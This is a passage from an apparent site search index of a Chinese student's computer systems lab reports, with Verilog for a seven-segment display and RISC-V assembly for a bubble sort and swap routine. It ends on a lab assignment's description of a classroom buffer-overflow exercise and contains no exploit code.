reg [ 7 : 0 ] shape_reg ; // \u9700\u8981\u4e00\u4e2a register \u6765\u5728 case \u8bed\u53e5\u4e2d\u8d4b\u503c assign shape = shape_reg ; always @( * ) begin case ( hex ) // case \u5404\u79cd hex \u60c5\u51b5 4'h0 : begin shape_reg <= 8 'b11000000 ; end 4'h1 : begin shape_reg <= 8 'b11111001 ; end 4'h2 : begin shape_reg <= 8 'b10100100 ; end 4'h3 : begin shape_reg <= 8 'b10110000 ; end 4'h4 : begin shape_reg <= 8 'b10011001 ; end 4'h5 : begin shape_reg <= 8 'b10010010 ; end 4'h6 : begin shape_reg <= 8 'b10000010 ; end 4'h7 : begin shape_reg <= 8 'b11111000 ; end 4'h8 : begin shape_reg <= 8 'b10000000 ; end 4'h9 : begin shape_reg <= 8 'b10010000 ; end 4'hA : begin shape_reg <= 8 'b10001000 ; end 4'hB : begin shape_reg <= 8 'b10000011 ; end 4'hC : begin shape_reg <= 8 'b11000110 ; end 4'hD : begin shape_reg <= 8 'b10100001 ; end 4'hE : begin shape_reg <= 8 'b10000110 ; end 4'hF : begin shape_reg <= 8 'b10001110 ; end default : begin shape_reg <= 8 'b11111111 ; end // \u867d\u7136\u4e0d\u4f1a\u89e6\u53d1\uff0c\u4f46\u8fd8\u662f\u5199\u4e86\u4e00\u4e2a\u4e0d\u663e\u793a\u7684 default endcase end endmodule","title":"\u4ee3\u7801"},{"location":"cs/system/cs1/lab3/#data_src","text":"","title":"\u5173\u8054\u5f00\u5173\u8f93\u5165\u4e0e data_src"},{"location":"cs/system/cs1/lab3/#_10","text":"\u7ed9\u51fa\u7684\u793a\u4f8b\u90e8\u5206\u662f\uff1a always @( posedge flash_clk ) begin // 32'h00000000 <-> 32'hffffffff if ( rstn ) data_src <= ~ data_src ; else data_src <= 0 ; end \u4e5f\u5c31\u662f\u5f53 rstn \u4e3a 1 \u7684\u65f6\u5019\uff0cdata_src \u88ab\u8d4b\u503c\u4e3a 32'hffffffff\uff0c\u6240\u4ee5\u8fd9\u4e2a\u91cc\u9762\u662f\u8981\u8fdb\u884c\u8d4b\u503c\u64cd\u4f5c\u7684\u4f4d\u7f6e\uff0c\u800c\u4e0b\u9762\u7684 else \u5219\u662f\u590d\u4f4d\u65f6\u8fdb\u884c\u7684\u8d4b\u503c\u64cd\u4f5c","title":"\u601d\u8def"},{"location":"cs/system/cs1/lab3/#_11","text":"\u6211\u8fd9\u91cc\u5c06\u516b\u4e2a\u4e03\u6bb5\u7ba1\u663e\u793a\u4e3a\u540c\u6837\u7684\u5b57\u7b26\uff0c\u90fd\u7531 SW \u63a7\u5236\uff1a always @( posedge flash_clk ) begin if ( rstn ) begin data_src [ 31 : 28 ] <= SW [ 3 : 0 ]; data_src [ 27 : 24 ] <= SW [ 3 : 0 ]; data_src [ 23 : 20 ] <= SW [ 3 : 0 ]; data_src [ 19 : 16 ] <= SW [ 3 : 0 ]; data_src [ 15 : 12 ] <= SW [ 3 : 0 ]; data_src [ 11 : 8 ] <= SW [ 3 : 0 ]; data_src [ 7 : 4 ] <= SW [ 3 : 0 ]; data_src [ 3 : 0 ] <= SW [ 3 : 0 ]; end else data_src <= 0 ; end","title":"\u4ee3\u7801"},{"location":"cs/system/cs1/lab3/#_12","text":"\u8fdb\u884c\u6240\u6709\u4fee\u6539\u540e\u8fdb\u884c\u4e86\u4e0a\u677f\u9a8c\u8bc1\uff0c\u5747\u6309\u7167\u9884\u671f\u663e\u793a\uff0c\u4e00\u5207\u6b63\u5e38\u3002","title":"\u4e0a\u677f\u6d4b\u8bd5"},{"location":"cs/system/cs1/lab4-1/","text":"RISC-V \u6c47\u7f16\u5b9e\u9a8c \u00b6 Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 lab4-1 \u5b9e\u9a8c\u62a5\u544a\uff082022.04.30 ~ 2022.05.13\uff09 Warning \u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad \u5b9e\u9a8c\u5185\u5bb9 \u00b6 \u5b9e\u9a8c 1 \u8f93\u5165\u6837\u4f8b\u6c47\u7f16\uff0c\u8fd0\u884c\u6c47\u7f16 \u5355\u6b65\u8c03\u8bd5\uff0c\u7ed9\u51fa\u6bcf\u6b21 x1 \u6570\u503c\u53d8\u5316\u7684\u622a\u56fe \u56de\u7b54 x7 \u6700\u7ec8\u7684\u6570\u503c \u5b9e\u9a8c 2 \u4eff\u7167\u6837\u4f8b\u7a0b\u5e8f\uff0c\u5c06\u5b66\u53f7 10 \u4e2a\u6570\u5b57\u4f9d\u6b21\u5199\u5230 memory \u5730\u5740 0x00040000 ~ 0x00040020 \u4f4d\u7f6e\u5904 \u5355\u6b65\u6267\u884c\uff0c\u5bf9\u5199\u5165\u5b66\u53f7\u90e8\u5206\u7684\u6548\u679c\u622a\u56fe \u7f16\u5199\u6c47\u7f16\u7a0b\u5e8f\uff0c\u5b9e\u73b0\u5192\u6ce1\u6392\u5e8f\u7b97\u6cd5\u3002\u8981\u6c42\u4ece\u4f4e\u5730\u5740\u5230\u9ad8\u5730\u5740\uff0c10 \u4f4d\u5b66\u53f7\u7684\u6570\u5b57\u4ece\u5927\u5230\u5c0f\u6392\u5e8f \u5355\u6b65\u6267\u884c\u7a0b\u5e8f\uff0c\u5bf9\u6bcf\u4e00\u8f6e\u626b\u63cf\u5b8c\u6210\u540e\u7684\u7ed3\u679c\u8fdb\u884c\u622a\u56fe \u7ed9\u51fa\u6c47\u7f16\u7a0b\u5e8f\u7684\u6e90\u4ee3\u7801\uff0c\u5e76\u7ed3\u5408\u4ee3\u7801\uff0c\u91cd\u70b9\u8bf4\u660e\u4e24\u5c42\u5faa\u73af\u7684\u5b9e\u73b0\u8fc7\u7a0b Bonus \u4fee\u6539\u4e0a\u8ff0\u7a0b\u5e8f\uff0c\u4f7f\u5f97\u4ea4\u6362 memory \u4e2d\u4e24\u4e2a\u6570\u7684\u4f4d\u7f6e\u7684\u8fc7\u7a0b swap \u4ee5\u51fd\u6570\u8c03\u7528\u7684\u5f62\u5f0f\u5b8c\u6210 \u5b9e\u9a8c 1 \u00b6 \u6c47\u7f16\u4ee3\u7801 \u00b6 # riscv initial: lui x6 , 0x666 addi x1 , x0 , 2 addi x2 , x1 , 14 sw x1 , 8 ( x2 ) l1: ori x3 , x1 , 4 slli x1 , x1 , 4 lw x4 , -8 ( x1 ) srai x1 , x1 , 1 beq x1 , x2 , l2 addi x6 , x6 , -1 l2: addi x1 , x0 , 2 bne x4 , x1 , l1 exit: add x7 , x2 , x2 \u4e00\u4e9b\u6307\u4ee4\uff1a lui x6 0x666\uff1a\u5c06 0x666 \u5b58\u81f3 x6 \u9ad8 20 \u4f4d addi x1, x0, 2\uff1a\u5c06 x0\uff080\uff09 \u52a0\u7acb\u5373\u6570 2 \u5b58\u81f3 x1 sw x1 8(x2)\uff1a\u5c06 x1 \u5b58\u81f3 memory \u4e2d\u5730\u5740 x2 + 8 \u7684\u4f4d\u7f6e ori x3, x1, 4\uff1a\u5c06 x1 \u4e0e\u7acb\u5373\u6570\u6309\u4f4d\u6216\uff0c\u5b58\u81f3 x3 \u4e2d slli x1, x1, 4\uff1a\u5c06 x1 \u903b\u8f91\u5de6\u79fb\u56db\u4f4d\u5b58\u5165 x1 \u4e2d lw x4, -8(x1)\uff1a\u5c06 memory \u4e2d\u5730\u5740 x1 - 8 \u4f4d\u7f6e\u7684\u503c\u8bfb\u5230 x4 \u4e2d srai x1, x1, 1\uff1a\u5c06 x1 \u903b\u8f91\u53f3\u79fb 1 \u4f4d\u5b58\u5165 x1 \u4e2d beq x1, x2, l2\uff1a\u82e5 x1 == x2 \u5219\u8df3\u5230\u6807\u53f7 l2 \u5904 bne x4, x1, l1\uff1a\u82e5 x4 != x1 \u5219\u8df3\u5230\u6807\u53f7 l1 \u5904 x1 \u53d8\u5316\u622a\u56fe \u00b6 \u5c06\u5355\u6b65\u8fd0\u884c\u65f6 x1 \u5bc4\u5b58\u5668\u7684\u503c\u62fc\u63a5\u4e86\u8d77\u6765 x7 \u6700\u7ec8\u503c\u4e3a 32 \u5b9e\u9a8c 2 \u00b6 \u5199\u5165\u5b66\u53f7 \u00b6 \u4eff\u7167\u6837\u4f8b addi x5 , x0 , 3 addi x6 , x0 , 0 lui x6 , 0x40 sw x5 , 0 ( x6 ) addi x5 , x0 , 2 sw x5 , 4 ( x6 ) addi x5 , x0 , 1 sw x5 , 8 ( x6 ) addi x5 , x0 , 1 ... \u5192\u6ce1\u6392\u5e8f \u00b6 # \u63a5\u4e0a\u9762\u4ee3\u7801 addi x5 , x0 , 40 # len addi t3 , x0 , 0 # i for1: addi t4 , x0 , 0 # j for2: add x7 , x6 , t4 lw t5 , 0 ( x7 ) lw t6 , 4 ( x7 ) bge t5 , t6 , for2_end sw t5 , 4 ( x7 ) sw t6 , 0 ( x7 ) for2_end: addi t4 , t4 , 4 addi t6 , x0 , 4 sub t5 , x5 , t6 sub t5 , t5 , t3 blt t4 , t5 , for2 for1_end: addi t3 , t3 , 4 addi t6 , x0 , 4 sub t5 , x5 , t6 blt t3 , t5 , for1 \u5148\u5c06\u957f\u5ea6 10 \u4e58 4 \u5b58\u5165 x5 \u4e2d\uff0c\u7136\u540e\u4e3a t3\uff08\u8868\u793a\u5916\u5c42\u5faa\u73af\u5faa\u73af\u53d8\u91cf\uff09\u8d4b\u521d\u503c 0\uff0c\u4e00\u4e2a\u6807\u53f7\u6807\u8bb0\u540e\u9762\u662f\u5916\u5c42\u5faa\u73af\uff0c\u5faa\u73af\u4e2d\u4e3a t3\uff08\u5185\u5c42\u5faa\u73af\u53d8\u91cf\uff09\u8d4b\u521d\u503c 0\uff0c\u518d\u4e00\u4e2a\u6807\u53f7\u6807\u8bb0\u540e\u9762\u662f\u5185\u5c42\u5faa\u73af\u3002\u5185\u5c42\u5faa\u73af\u4e2d\u5148\u5c06 x6\uff08\u5b58\u503c\u7684 memory \u8d77\u59cb\u5730\u5740\uff09\u52a0\u4e0a j\uff0c\u7136\u540e\u5206\u522b\u8bfb\u53d6\u504f\u79fb\u4e3a 0 \u548c 4 \u7684\u5185\u5bb9\u5230 t5\uff08a[j]\uff09\u3001t6\uff08a[j+1]\uff09\uff0c\u6bd4\u8f83\uff0c\u5982\u679c t5 \u5927\u4e8e\u7b49\u4e8e t6 \u5219\u4e0d\u8fdb\u884c\u4ea4\u6362\u64cd\u4f5c\uff0c\u76f4\u63a5\u8df3\u5230 for2_end\uff0c\u5426\u5219\u4ea4\u6362\u5b58\u5230\u53e6\u4e00\u65b9\u7684\u4f4d\u7f6e\u4e2d\u3002for2_end \u4e2d\u5904\u7406\u5faa\u73af\u53d8\u91cf\u5e76\u4e14\u5224\u65ad\uff0c\u6bcf\u6b21\u4e3a t4 \u52a0 4\uff0c\u7136\u540e\u8ba1\u7b97\u4e00\u4e0b x5 - t3 - 4\uff08len-i-1\uff09\uff0c\u5224\u65ad t4 \u548c\u5b83\u7684\u5927\u5c0f\uff0c\u5982\u679c\u5c0f\u4e8e\u5219\u8fd4\u56de for2_end \u7ee7\u7eed\u5185\u5c42\u5faa\u73af\uff0c\u5426\u5219\u987a\u6b21\u8fdb\u5165 for1_end \u4e2d\uff0c\u540e\u9762\u4e3a t3 \u52a0 4\uff0c\u5224\u65ad\u5176\u548c x5-4\uff08len-1\uff09\u7684\u5927\u5c0f\u5173\u7cfb\uff0c\u5982\u679c\u5c0f\u4e8e\u5219\u8fd4\u56de for1 \u4e2d\u7ee7\u7eed\u5916\u5c42\u5faa\u73af\uff0c\u5426\u5219\u76f4\u63a5\u7ed3\u675f\u7a0b\u5e8f \u6bcf\u8f6e\u5192\u6ce1\u7684\u7ed3\u679c \u00b6 \uff08\u9690\u79c1\u95ee\u9898\uff0c\u4e0d\u5c55\u793a\uff09 \u6700\u540e\u4e00\u6b21\u5c31\u662f\u6392\u597d\u5e8f\u540e\u7684\u7ed3\u679c Bonus \u00b6 \u7531\u4e8e\u63d0\u4f9b\u7684 interpreter \u4e0d\u652f\u6301\u4e00\u822c\u7684\u51fd\u6570\u64cd\u4f5c\uff0c\u6240\u4ee5\u4f7f\u7528 sp \u6307\u9488\u6a21\u62df\u6808\u3001jal \u6307\u9488\u624b\u52a8\u8df3\u8f6c\u6765\u6a21\u62df\u51fd\u6570\u884c\u4e3a swap \u51fd\u6570\uff08\u4ece\u6808\u4e0a\u53d6\u4e24\u4e2a\u6570\uff0c\u4ea4\u6362\u518d\u653e\u56de\u53bb\uff09\uff1a swap: addi sp , sp , -4 lw a0 , 0 ( sp ) addi sp , sp , -4 lw a1 , 0 ( sp ) add a2 , x0 , a1 add a1 , x0 , a0 add a0 , x0 , a2 sw a1 , 0 ( sp ) addi sp , sp , 4 sw a0 , 0 ( sp ) addi sp , sp , 4 jal x0 , swap_exit \u5b8c\u6574\u4ee3\u7801\uff1a addi x5 , x0 , 3 addi x6 , x0 , 0 lui x6 , 0x40 sw x5 , 0 ( x6 ) addi x5 , x0 , 2 sw x5 , 4 ( x6 ) addi x5 , x0 , 1 sw x5 , 8 ( x6 ) addi x5 , x0 , 1 sw x5 , 0x10 ( x6 ) ... addi sp , x0 , 0 lui sp , 0x80 addi x5 , x0 , 40 # len addi t3 , x0 , 0 # i for1: addi t4 , x0 , 0 # j for2: add x7 , x6 , t4 lw t5 , 0 ( x7 ) lw t6 , 4 ( x7 ) bge t5 , t6 , for2_end sw t5 , 0 ( sp ) addi sp , sp , 4 sw t6 , 0 ( sp ) addi sp , sp , 4 jal x0 , swap swap_exit: addi sp , sp , -4 lw t6 , 0 ( sp ) addi sp , sp , -4 lw t5 , 0 ( sp ) sw t5 , 0 ( x7 ) sw t6 , 4 ( x7 ) for2_end: addi t4 , t4 , 4 addi t6 , x0 , 4 sub t5 , x5 , t6 sub t5 , t5 , t3 blt t4 , t5 , for2 for1_end: addi t3 , t3 , 4 addi t6 , x0 , 4 sub t5 , x5 , t6 blt t3 , t5 , for1 jal x0 , exit swap: addi sp , sp , -4 lw a0 , 0 ( sp ) addi sp , sp , -4 lw a1 , 0 ( sp ) add a2 , x0 , a1 add a1 , x0 , a0 add a0 , x0 , a2 sw a1 , 0 ( sp ) addi sp , sp , 4 sw a0 , 0 ( sp ) addi sp , sp , 4 jal x0 , swap_exit exit: addi x0 , x0 , 0 \u7ecf\u5355\u6b65\u8fd0\u884c\u6d4b\u8bd5\uff0c\u7ed3\u679c\u4e0e\u539f\u6765\u4e00\u81f4\u3002","title":"\u7cfb\u7edf I lab4-1"},{"location":"cs/system/cs1/lab4-1/#risc-v","text":"Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 lab4-1 \u5b9e\u9a8c\u62a5\u544a\uff082022.04.30 ~ 2022.05.13\uff09 Warning \u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad","title":"RISC-V \u6c47\u7f16\u5b9e\u9a8c"},{"location":"cs/system/cs1/lab4-1/#_1","text":"\u5b9e\u9a8c 1 \u8f93\u5165\u6837\u4f8b\u6c47\u7f16\uff0c\u8fd0\u884c\u6c47\u7f16 \u5355\u6b65\u8c03\u8bd5\uff0c\u7ed9\u51fa\u6bcf\u6b21 x1 \u6570\u503c\u53d8\u5316\u7684\u622a\u56fe \u56de\u7b54 x7 \u6700\u7ec8\u7684\u6570\u503c \u5b9e\u9a8c 2 \u4eff\u7167\u6837\u4f8b\u7a0b\u5e8f\uff0c\u5c06\u5b66\u53f7 10 \u4e2a\u6570\u5b57\u4f9d\u6b21\u5199\u5230 memory \u5730\u5740 0x00040000 ~ 0x00040020 \u4f4d\u7f6e\u5904 \u5355\u6b65\u6267\u884c\uff0c\u5bf9\u5199\u5165\u5b66\u53f7\u90e8\u5206\u7684\u6548\u679c\u622a\u56fe \u7f16\u5199\u6c47\u7f16\u7a0b\u5e8f\uff0c\u5b9e\u73b0\u5192\u6ce1\u6392\u5e8f\u7b97\u6cd5\u3002\u8981\u6c42\u4ece\u4f4e\u5730\u5740\u5230\u9ad8\u5730\u5740\uff0c10 \u4f4d\u5b66\u53f7\u7684\u6570\u5b57\u4ece\u5927\u5230\u5c0f\u6392\u5e8f \u5355\u6b65\u6267\u884c\u7a0b\u5e8f\uff0c\u5bf9\u6bcf\u4e00\u8f6e\u626b\u63cf\u5b8c\u6210\u540e\u7684\u7ed3\u679c\u8fdb\u884c\u622a\u56fe \u7ed9\u51fa\u6c47\u7f16\u7a0b\u5e8f\u7684\u6e90\u4ee3\u7801\uff0c\u5e76\u7ed3\u5408\u4ee3\u7801\uff0c\u91cd\u70b9\u8bf4\u660e\u4e24\u5c42\u5faa\u73af\u7684\u5b9e\u73b0\u8fc7\u7a0b Bonus \u4fee\u6539\u4e0a\u8ff0\u7a0b\u5e8f\uff0c\u4f7f\u5f97\u4ea4\u6362 memory \u4e2d\u4e24\u4e2a\u6570\u7684\u4f4d\u7f6e\u7684\u8fc7\u7a0b swap \u4ee5\u51fd\u6570\u8c03\u7528\u7684\u5f62\u5f0f\u5b8c\u6210","title":"\u5b9e\u9a8c\u5185\u5bb9"},{"location":"cs/system/cs1/lab4-1/#1","text":"","title":"\u5b9e\u9a8c 1"},{"location":"cs/system/cs1/lab4-1/#_2","text":"# riscv initial: lui x6 , 0x666 addi x1 , x0 , 2 addi x2 , x1 , 14 sw x1 , 8 ( x2 ) l1: ori x3 , x1 , 4 slli x1 , x1 , 4 lw x4 , -8 ( x1 ) srai x1 , x1 , 1 beq x1 , x2 , l2 addi x6 , x6 , -1 l2: addi x1 , x0 , 2 bne x4 , x1 , l1 exit: add x7 , x2 , x2 \u4e00\u4e9b\u6307\u4ee4\uff1a lui x6 0x666\uff1a\u5c06 0x666 \u5b58\u81f3 x6 \u9ad8 20 \u4f4d addi x1, x0, 2\uff1a\u5c06 x0\uff080\uff09 \u52a0\u7acb\u5373\u6570 2 \u5b58\u81f3 x1 sw x1 8(x2)\uff1a\u5c06 x1 \u5b58\u81f3 memory \u4e2d\u5730\u5740 x2 + 8 \u7684\u4f4d\u7f6e ori x3, x1, 4\uff1a\u5c06 x1 \u4e0e\u7acb\u5373\u6570\u6309\u4f4d\u6216\uff0c\u5b58\u81f3 x3 \u4e2d slli x1, x1, 4\uff1a\u5c06 x1 \u903b\u8f91\u5de6\u79fb\u56db\u4f4d\u5b58\u5165 x1 \u4e2d lw x4, -8(x1)\uff1a\u5c06 memory \u4e2d\u5730\u5740 x1 - 8 \u4f4d\u7f6e\u7684\u503c\u8bfb\u5230 x4 \u4e2d srai x1, x1, 1\uff1a\u5c06 x1 \u903b\u8f91\u53f3\u79fb 1 \u4f4d\u5b58\u5165 x1 \u4e2d beq x1, x2, l2\uff1a\u82e5 x1 == x2 \u5219\u8df3\u5230\u6807\u53f7 l2 \u5904 bne x4, x1, l1\uff1a\u82e5 x4 != x1 \u5219\u8df3\u5230\u6807\u53f7 l1 \u5904","title":"\u6c47\u7f16\u4ee3\u7801"},{"location":"cs/system/cs1/lab4-1/#x1","text":"\u5c06\u5355\u6b65\u8fd0\u884c\u65f6 x1 \u5bc4\u5b58\u5668\u7684\u503c\u62fc\u63a5\u4e86\u8d77\u6765 x7 \u6700\u7ec8\u503c\u4e3a 32","title":"x1 \u53d8\u5316\u622a\u56fe"},{"location":"cs/system/cs1/lab4-1/#2","text":"","title":"\u5b9e\u9a8c 2"},{"location":"cs/system/cs1/lab4-1/#_3","text":"\u4eff\u7167\u6837\u4f8b addi x5 , x0 , 3 addi x6 , x0 , 0 lui x6 , 0x40 sw x5 , 0 ( x6 ) addi x5 , x0 , 2 sw x5 , 4 ( x6 ) addi x5 , x0 , 1 sw x5 , 8 ( x6 ) addi x5 , x0 , 1 ...","title":"\u5199\u5165\u5b66\u53f7"},{"location":"cs/system/cs1/lab4-1/#_4","text":"# \u63a5\u4e0a\u9762\u4ee3\u7801 addi x5 , x0 , 40 # len addi t3 , x0 , 0 # i for1: addi t4 , x0 , 0 # j for2: add x7 , x6 , t4 lw t5 , 0 ( x7 ) lw t6 , 4 ( x7 ) bge t5 , t6 , for2_end sw t5 , 4 ( x7 ) sw t6 , 0 ( x7 ) for2_end: addi t4 , t4 , 4 addi t6 , x0 , 4 sub t5 , x5 , t6 sub t5 , t5 , t3 blt t4 , t5 , for2 for1_end: addi t3 , t3 , 4 addi t6 , x0 , 4 sub t5 , x5 , t6 blt t3 , t5 , for1 \u5148\u5c06\u957f\u5ea6 10 \u4e58 4 \u5b58\u5165 x5 \u4e2d\uff0c\u7136\u540e\u4e3a t3\uff08\u8868\u793a\u5916\u5c42\u5faa\u73af\u5faa\u73af\u53d8\u91cf\uff09\u8d4b\u521d\u503c 0\uff0c\u4e00\u4e2a\u6807\u53f7\u6807\u8bb0\u540e\u9762\u662f\u5916\u5c42\u5faa\u73af\uff0c\u5faa\u73af\u4e2d\u4e3a t3\uff08\u5185\u5c42\u5faa\u73af\u53d8\u91cf\uff09\u8d4b\u521d\u503c 0\uff0c\u518d\u4e00\u4e2a\u6807\u53f7\u6807\u8bb0\u540e\u9762\u662f\u5185\u5c42\u5faa\u73af\u3002\u5185\u5c42\u5faa\u73af\u4e2d\u5148\u5c06 x6\uff08\u5b58\u503c\u7684 memory \u8d77\u59cb\u5730\u5740\uff09\u52a0\u4e0a j\uff0c\u7136\u540e\u5206\u522b\u8bfb\u53d6\u504f\u79fb\u4e3a 0 \u548c 4 \u7684\u5185\u5bb9\u5230 t5\uff08a[j]\uff09\u3001t6\uff08a[j+1]\uff09\uff0c\u6bd4\u8f83\uff0c\u5982\u679c t5 \u5927\u4e8e\u7b49\u4e8e t6 \u5219\u4e0d\u8fdb\u884c\u4ea4\u6362\u64cd\u4f5c\uff0c\u76f4\u63a5\u8df3\u5230 for2_end\uff0c\u5426\u5219\u4ea4\u6362\u5b58\u5230\u53e6\u4e00\u65b9\u7684\u4f4d\u7f6e\u4e2d\u3002for2_end \u4e2d\u5904\u7406\u5faa\u73af\u53d8\u91cf\u5e76\u4e14\u5224\u65ad\uff0c\u6bcf\u6b21\u4e3a t4 \u52a0 4\uff0c\u7136\u540e\u8ba1\u7b97\u4e00\u4e0b x5 - t3 - 4\uff08len-i-1\uff09\uff0c\u5224\u65ad t4 \u548c\u5b83\u7684\u5927\u5c0f\uff0c\u5982\u679c\u5c0f\u4e8e\u5219\u8fd4\u56de for2_end \u7ee7\u7eed\u5185\u5c42\u5faa\u73af\uff0c\u5426\u5219\u987a\u6b21\u8fdb\u5165 for1_end \u4e2d\uff0c\u540e\u9762\u4e3a t3 \u52a0 4\uff0c\u5224\u65ad\u5176\u548c x5-4\uff08len-1\uff09\u7684\u5927\u5c0f\u5173\u7cfb\uff0c\u5982\u679c\u5c0f\u4e8e\u5219\u8fd4\u56de for1 \u4e2d\u7ee7\u7eed\u5916\u5c42\u5faa\u73af\uff0c\u5426\u5219\u76f4\u63a5\u7ed3\u675f\u7a0b\u5e8f","title":"\u5192\u6ce1\u6392\u5e8f"},{"location":"cs/system/cs1/lab4-1/#_5","text":"\uff08\u9690\u79c1\u95ee\u9898\uff0c\u4e0d\u5c55\u793a\uff09 \u6700\u540e\u4e00\u6b21\u5c31\u662f\u6392\u597d\u5e8f\u540e\u7684\u7ed3\u679c","title":"\u6bcf\u8f6e\u5192\u6ce1\u7684\u7ed3\u679c"},{"location":"cs/system/cs1/lab4-1/#bonus","text":"\u7531\u4e8e\u63d0\u4f9b\u7684 interpreter \u4e0d\u652f\u6301\u4e00\u822c\u7684\u51fd\u6570\u64cd\u4f5c\uff0c\u6240\u4ee5\u4f7f\u7528 sp \u6307\u9488\u6a21\u62df\u6808\u3001jal \u6307\u9488\u624b\u52a8\u8df3\u8f6c\u6765\u6a21\u62df\u51fd\u6570\u884c\u4e3a swap \u51fd\u6570\uff08\u4ece\u6808\u4e0a\u53d6\u4e24\u4e2a\u6570\uff0c\u4ea4\u6362\u518d\u653e\u56de\u53bb\uff09\uff1a swap: addi sp , sp , -4 lw a0 , 0 ( sp ) addi sp , sp , -4 lw a1 , 0 ( sp ) add a2 , x0 , a1 add a1 , x0 , a0 add a0 , x0 , a2 sw a1 , 0 ( sp ) addi sp , sp , 4 sw a0 , 0 ( sp ) addi sp , sp , 4 jal x0 , swap_exit \u5b8c\u6574\u4ee3\u7801\uff1a addi x5 , x0 , 3 addi x6 , x0 , 0 lui x6 , 0x40 sw x5 , 0 ( x6 ) addi x5 , x0 , 2 sw x5 , 4 ( x6 ) addi x5 , x0 , 1 sw x5 , 8 ( x6 ) addi x5 , x0 , 1 sw x5 , 0x10 ( x6 ) ... addi sp , x0 , 0 lui sp , 0x80 addi x5 , x0 , 40 # len addi t3 , x0 , 0 # i for1: addi t4 , x0 , 0 # j for2: add x7 , x6 , t4 lw t5 , 0 ( x7 ) lw t6 , 4 ( x7 ) bge t5 , t6 , for2_end sw t5 , 0 ( sp ) addi sp , sp , 4 sw t6 , 0 ( sp ) addi sp , sp , 4 jal x0 , swap swap_exit: addi sp , sp , -4 lw t6 , 0 ( sp ) addi sp , sp , -4 lw t5 , 0 ( sp ) sw t5 , 0 ( x7 ) sw t6 , 4 ( x7 ) for2_end: addi t4 , t4 , 4 addi t6 , x0 , 4 sub t5 , x5 , t6 sub t5 , t5 , t3 blt t4 , t5 , for2 for1_end: addi t3 , t3 , 4 addi t6 , x0 , 4 sub t5 , x5 , t6 blt t3 , t5 , for1 jal x0 , exit swap: addi sp , sp , -4 lw a0 , 0 ( sp ) addi sp , sp , -4 lw a1 , 0 ( sp ) add a2 , x0 , a1 add a1 , x0 , a0 add a0 , x0 , a2 sw a1 , 0 ( sp ) addi sp , sp , 4 sw a0 , 0 ( sp ) addi sp , sp , 4 jal x0 , swap_exit exit: addi x0 , x0 , 0 \u7ecf\u5355\u6b65\u8fd0\u884c\u6d4b\u8bd5\uff0c\u7ed3\u679c\u4e0e\u539f\u6765\u4e00\u81f4\u3002","title":"Bonus"},{"location":"cs/system/cs1/lab4-2/","text":"overflow \u7406\u89e3 \u00b6 Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 lab4-2 \u5b9e\u9a8c\u62a5\u544a\uff082022.05.06 ~ 2022.05.27\uff09 Warning \u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad \u5b9e\u9a8c\u5185\u5bb9 \u00b6 \u7406\u89e3 ELF \u6587\u4ef6\u548c\u6c47\u7f16\u6587\u4ef6 riscv32-unknown-linux-gnu-objdump -d key\uff0c\u6765\u5c1d\u8bd5\u7406\u89e3\u5728\u7f16\u8bd1\u5668\u5c42\u9762\uff0c\u5404\u4e2a\u7a0b\u5e8f\u4ee3\u7801\u6bb5\u548c\u6570\u636e\u6bb5\u7684\u5206\u5e03 \u5c1d\u8bd5\u8fd0\u884c RISCV \u7684 ELF \u6587\u4ef6\uff0c\u4f7f\u7528 qemu \u6765\u8fd0\u884c key \u8f93\u5165\u5b66\u53f7\u548c key \u9605\u8bfb\u6c47\u7f16 key.s \u6587\u4ef6\uff0c\u5c1d\u8bd5\u7834\u89e3\u81ea\u5df1\u5b66\u53f7\u5bf9\u5e94\u7684 key Buffer Overflow \u6211\u4eec\u7ed9\u4e86\u88ab\u653b\u51fb\u7a0b\u5e8f\u7684\u6e90\u4ee3\u7801 bof.c\uff0c\u8bf7\u5728\u7406\u89e3 bof.c \u7a0b\u5e8f\u884c\u4e3a\u7684\u57fa\u7840\u4e0a\uff0c\u5b8c\u6210\u4e00\u6b21\u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb\u3002\u9996\u5148\u4f7f\u7528\u7f16\u8bd1\u751f\u6210 ELF \u7136\u540e\u6267\u884c bof\u3002\u9996\u5148\u8f93\u5165\u4f60\u7684\u5b66\u53f7\uff0c\u4e4b\u540e\u51fa\u73b0\u63d0\u793a Tell me something to overflow me:\uff0c\u5728\u8fd9\u4e0b\u9762\u8f93\u5165\u76f8\u5e94\u7684\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u653b\u51fb\u5931\u8d25\uff0c\u663e\u793a you can\u2018t hack me,please try again! \u5982\u679c\u653b\u51fb\u6210\u529f\uff0c\u5219\u7a0b\u5e8f\u663e\u793a\u6ea2\u51fa\u6210\u529f\uff0c\u7a0b\u5e8f\u6b63\u5e38\u7ed3\u675f\u3002\u8bf7\u5728\u8ba4\u771f\u5206\u6790\u6240\u7ed9\u6c47\u7f16\u4ee3\u7801\u548c\u6e90\u4ee3\u7801\u7684\u57fa\u7840\u4e0a\uff0c\u6784\u9020\u4e00\u4e2a\u5408\u9002\u7684\u5b57\u7b26\u4e32\uff0c\u5b8c\u6210\u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb\uff0c\u5e76\u8bf7\u52a1\u5fc5\u8be6\u7ec6\u8bf4\u660e\u4f60\u7684\u5206\u6790\u8fc7\u7a0b\u4ee5\u53ca\u4f9d\u636e\u3002\u63d0\u793a\uff1a\u91cd\u70b9\u5206\u6790 Hear \u51fd\u6570\u5373\u53ef\u3002 \u4f46\u5b9e\u9645\u4e0a\u8fd8\u9700\u8981\u8003\u8651\u4e00\u79cd\u7279\u6b8a\u60c5\u51b5\uff0c\u867d\u7136\u663e\u793a\u653b\u51fb\u6210\u529f\uff0c\u4f46\u662f\u51fa\u73b0\u4e86\u6bb5\u9519\u8bef\uff0c\u8bf7\u63a2\u7d22\u8fd9\u79cd\u60c5\u51b5\u51fa\u73b0\u7684\u6761\u4ef6\uff0c\u5e76\u7ed9\u51fa\u8be6\u7ec6\u7684\u5206\u6790\u8bf4\u660e\u4e3a\u4ec0\u4e48\u4f1a\u51fa\u73b0\u8fd9\u79cd\u72b6\u51b5\u3002 Bonus: Heap Overflow 